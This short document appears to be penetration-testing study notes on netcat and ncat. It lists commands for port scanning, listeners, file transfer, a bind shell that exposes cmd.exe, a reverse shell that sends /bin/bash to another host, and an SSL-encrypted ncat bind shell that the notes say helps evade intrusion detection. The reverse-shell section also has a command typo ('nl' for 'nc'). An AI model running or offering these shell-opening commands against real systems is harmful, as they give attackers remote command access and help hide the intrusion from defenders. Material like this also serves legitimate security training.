Netcat
windows 10.0.0.1
linux 10.0.0.2

use netcat to check if TCP port 110(POP3 mail service) is open on a host
\\nc -nv 10.0.0.1 110

use netcat as a listener
\\nc -nlvp 4444

connect to the lister from our attacker machine
\\nc -nv 10.0.0.1 4444

transfer files between hosts with netcat (from Linux machine to Windows)
sets up the windows machine to accept any file on 4444 and name it file.exe
\\nc -nlvp 4444 > file.exe

push the file from linux
\\nc -nv 10.0.0.1 4444 < /usr/share/windows-binaries/example.exe

netcat bind shell
from the windows host: binds the cmd exe to port 4444 on the windows host
\\nc -nlvp 4444 -e cmd.exe
connect to port 4444 from linux machine and should be presented with cmd prompt

netcat reverse shell
windows:
\\nl -nlvp 4444

linux:
\\nc -nv 10.0.0.1 4444 -e /bin/bash

Ncat allows for the ability to authenticate and encrypt incoming and outgoing connections.
encryption will help avoid IDS's and allow for authentication on shells

ncat example of a bind shell that is ssl encrupted and will only allow the linux machines IP to connect
windows:
\\ncat --exec cmd --allow 10.0.0.2 -vnl 4444 -ssl
linux
\\ncat -v 10.0.0.1 4444 -ssl
